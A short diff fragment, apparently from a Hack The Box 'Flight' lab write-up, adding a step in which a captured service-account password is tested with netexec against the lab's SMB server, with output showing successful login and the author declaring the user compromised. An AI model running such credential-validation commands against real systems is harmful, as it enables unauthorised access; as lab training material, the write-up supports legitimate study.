@@ -297,5 +297,10 @@ svc_apache:S@Ss!K@*t13
 I will now validate these creds
 
 ```python
-
+nxc smb g0.flight.htb -u svc_apache -p 'S@Ss!K@*t13'  
+SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13
 ```
+I have compromised this user
+
+
